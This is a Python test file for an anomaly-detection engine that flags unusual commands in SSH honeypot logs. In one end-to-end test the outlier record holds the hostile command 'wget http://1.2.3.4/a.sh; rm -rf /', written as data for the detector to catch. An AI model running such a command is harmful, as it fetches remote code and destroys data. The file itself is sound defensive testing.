"""Isolated unit tests for AIInferenceEngine.

Uses directly constructed DatasetRecord objects and simple fake
collaborators to prove orchestration, plus one real-component
end-to-end test using a small deterministic synthetic dataset (not
pinned to exact sklearn scores). Requires no Cowrie, no Docker, no
network, no database, no real log files, and no other external
services.
"""

import dataclasses

from core.ai_engine.anomaly_detector import AnomalyDetector
from core.ai_engine.anomaly_result import AnomalyResult
from core.ai_engine.feature_matrix import FEATURE_NAMES, FeatureMatrix
from core.ai_engine.inference import AIInferenceEngine
from core.dataset_manager.builder import DatasetRecord


def _make_record(**overrides) -> DatasetRecord:
    defaults = dict(
        timestamp="2026-08-19T18:00:22.557428Z",
        source_ip="127.0.0.1",
        session_id="ce82815367a4",
        protocol="ssh",
        honeypot="Cowrie",
        event_type="cowrie.command.input",
        category="command_execution",
        severity="low",
        command="pwd",
        has_command=True,
        command_length=3,
        has_url=False,
        has_ip_address=False,
        has_file_path=False,
        has_shell_metacharacters=False,
    )
    defaults.update(overrides)
    return DatasetRecord(**defaults)


def _fake_matrix_for(records) -> FeatureMatrix:
    """A trivial FeatureMatrix with one placeholder row per record."""
    return FeatureMatrix(feature_names=FEATURE_NAMES, rows=[(0, 0, 0, 0, 0, 0)] * len(records))


class _FakeMatrixBuilder:
    """Fake FeatureMatrixBuilder that returns a fixed matrix and records inputs."""

    def __init__(self, matrix):
        self._matrix = matrix
        self.received_records = None

    def build(self, records):
        self.received_records = list(records)
        return self._matrix


class _FakeDetector:
    """Fake AnomalyDetector that returns fixed predictions/scores and records calls."""

    def __init__(self, predictions, scores):
        self._predictions = predictions
        self._scores = scores
        self.fitted_matrix = None
        self.predicted_matrix = None
        self.scored_matrix = None

    def fit(self, matrix):
        self.fitted_matrix = matrix

    def predict(self, matrix):
        self.predicted_matrix = matrix
        return list(self._predictions)

    def score(self, matrix):
        self.scored_matrix = matrix
        return list(self._scores)


class _FakeResultBuilder:
    """Fake AnomalyResultBuilder that records inputs and returns real AnomalyResults."""

    def __init__(self):
        self.build_calls = []

    def build(self, record, prediction, score):
        self.build_calls.append((record, prediction, score))
        return AnomalyResult(
            record=record,
            prediction=prediction,
            score=float(score),
            is_anomaly=(prediction == -1),
        )


def test_empty_input_returns_empty_list():
    assert AIInferenceEngine().analyze([]) == []


def test_one_record_produces_one_anomaly_result():
    records = [_make_record(command="pwd")]
    engine = AIInferenceEngine(
        matrix_builder=_FakeMatrixBuilder(_fake_matrix_for(records)),
        detector=_FakeDetector(predictions=[1], scores=[0.2]),
        result_builder=_FakeResultBuilder(),
    )

    results = engine.analyze(records)

    assert len(results) == 1


def test_multiple_records_produce_same_number_of_results():
    records = [_make_record(command="pwd"), _make_record(command="ls"), _make_record(command="id")]
    engine = AIInferenceEngine(
        matrix_builder=_FakeMatrixBuilder(_fake_matrix_for(records)),
        detector=_FakeDetector(predictions=[1, -1, 1], scores=[0.2, -0.5, 0.1]),
        result_builder=_FakeResultBuilder(),
    )

    results = engine.analyze(records)

    assert len(results) == 3


def test_input_order_is_preserved():
    records = [
        _make_record(command="pwd", command_length=3),
        _make_record(command="whoami", command_length=6),
        _make_record(command="ls -la", command_length=6),
    ]
    engine = AIInferenceEngine(
        matrix_builder=_FakeMatrixBuilder(_fake_matrix_for(records)),
        detector=_FakeDetector(predictions=[1, 1, -1], scores=[0.1, 0.2, -0.3]),
        result_builder=_FakeResultBuilder(),
    )

    results = engine.analyze(records)

    assert [result.record.command for result in results] == ["pwd", "whoami", "ls -la"]


def test_feature_matrix_builder_is_actually_used():
    records = [_make_record(command="pwd"), _make_record(command="ls")]
    fake_matrix_builder = _FakeMatrixBuilder(_fake_matrix_for(records))
    engine = AIInferenceEngine(
        matrix_builder=fake_matrix_builder,
        detector=_FakeDetector(predictions=[1, 1], scores=[0.1, 0.2]),
        result_builder=_FakeResultBuilder(),
    )

    engine.analyze(records)

    assert fake_matrix_builder.received_records == records


def test_anomaly_detector_is_actually_used():
    records = [_make_record(command="pwd")]
    fake_matrix = _fake_matrix_for(records)
    fake_detector = _FakeDetector(predictions=[-1], scores=[-0.4])
    engine = AIInferenceEngine(
        matrix_builder=_FakeMatrixBuilder(fake_matrix),
        detector=fake_detector,
        result_builder=_FakeResultBuilder(),
    )

    engine.analyze(records)

    assert fake_detector.fitted_matrix is fake_matrix
    assert fake_detector.predicted_matrix is fake_matrix
    assert fake_detector.scored_matrix is fake_matrix


def test_anomaly_result_builder_is_actually_used():
    records = [_make_record(command="pwd"), _make_record(command="ls")]
    fake_result_builder = _FakeResultBuilder()
    engine = AIInferenceEngine(
        matrix_builder=_FakeMatrixBuilder(_fake_matrix_for(records)),
        detector=_FakeDetector(predictions=[1, -1], scores=[0.1, -0.2]),
        result_builder=fake_result_builder,
    )

    engine.analyze(records)

    assert len(fake_result_builder.build_calls) == 2


def test_prediction_and_score_are_paired_with_correct_record():
    record_a = _make_record(command="pwd")
    record_b = _make_record(command="ls")
    records = [record_a, record_b]
    engine = AIInferenceEngine(
        matrix_builder=_FakeMatrixBuilder(_fake_matrix_for(records)),
        detector=_FakeDetector(predictions=[1, -1], scores=[0.1, -0.9]),
        result_builder=_FakeResultBuilder(),
    )

    results = engine.analyze(records)

    assert results[0].record is record_a
    assert results[0].prediction == 1
    assert results[0].score == 0.1
    assert results[1].record is record_b
    assert results[1].prediction == -1
    assert results[1].score == -0.9


def test_original_dataset_records_are_preserved_by_identity():
    record = _make_record(command="pwd")
    engine = AIInferenceEngine(
        matrix_builder=_FakeMatrixBuilder(_fake_matrix_for([record])),
        detector=_FakeDetector(predictions=[1], scores=[0.1]),
        result_builder=_FakeResultBuilder(),
    )

    results = engine.analyze([record])

    assert results[0].record is record


def test_input_dataset_records_are_not_modified():
    record = _make_record(command="pwd", command_length=3)
    original_command = record.command
    original_length = record.command_length
    engine = AIInferenceEngine(
        matrix_builder=_FakeMatrixBuilder(_fake_matrix_for([record])),
        detector=_FakeDetector(predictions=[1], scores=[0.1]),
        result_builder=_FakeResultBuilder(),
    )

    engine.analyze([record])

    assert record.command == original_command
    assert record.command_length == original_length


def test_dependency_injection_works():
    records = [_make_record(command="pwd")]
    fake_matrix = _fake_matrix_for(records)
    fake_matrix_builder = _FakeMatrixBuilder(fake_matrix)
    fake_detector = _FakeDetector(predictions=[-1], scores=[-0.5])
    fake_result_builder = _FakeResultBuilder()

    engine = AIInferenceEngine(
        matrix_builder=fake_matrix_builder,
        detector=fake_detector,
        result_builder=fake_result_builder,
    )
    results = engine.analyze(records)

    assert fake_matrix_builder.received_records == records
    assert fake_detector.fitted_matrix is fake_matrix
    assert len(fake_result_builder.build_calls) == 1
    assert results[0].prediction == -1


def test_repeated_analysis_with_deterministic_collaborators_is_identical():
    records = [_make_record(command="pwd"), _make_record(command="ls")]

    def build_engine():
        return AIInferenceEngine(
            matrix_builder=_FakeMatrixBuilder(_fake_matrix_for(records)),
            detector=_FakeDetector(predictions=[1, -1], scores=[0.3, -0.4]),
            result_builder=_FakeResultBuilder(),
        )

    first_results = build_engine().analyze(records)
    second_results = build_engine().analyze(records)

    assert first_results == second_results


def test_normal_prediction_semantics_remain_unchanged():
    # Small synthetic cluster + one clear outlier, using the real
    # FeatureMatrixBuilder/AnomalyDetector/AnomalyResultBuilder (no
    # fakes) to confirm end-to-end wiring preserves IsolationForest's
    # own 1/-1 semantics, without pinning to exact sklearn scores.
    normal_records = [
        _make_record(command="pwd", command_length=3, has_command=True) for _ in range(9)
    ]
    outlier_record = _make_record(
        command="wget http://1.2.3.4/a.sh; rm -rf /",
        command_length=500,
        has_command=True,
        has_url=True,
        has_ip_address=True,
        has_file_path=True,
        has_shell_metacharacters=True,
    )
    records = normal_records + [outlier_record]

    engine = AIInferenceEngine(detector=AnomalyDetector(contamination=0.1, random_state=42))
    results = engine.analyze(records)

    assert len(results) == 10
    assert all(result.prediction in (1, -1) for result in results)
    assert all(result.is_anomaly == (result.prediction == -1) for result in results)
    assert any(result.is_anomaly for result in results)


def test_no_attack_or_benign_labels_are_introduced():
    result_fields = {field.name for field in dataclasses.fields(AnomalyResult)}
    forbidden = {
        "attack_label",
        "benign_label",
        "malware",
        "brute_force",
        "confidence",
        "probability",
        "threat_level",
    }
    assert result_fields.isdisjoint(forbidden)
    assert result_fields == {"record", "prediction", "score", "is_anomaly"}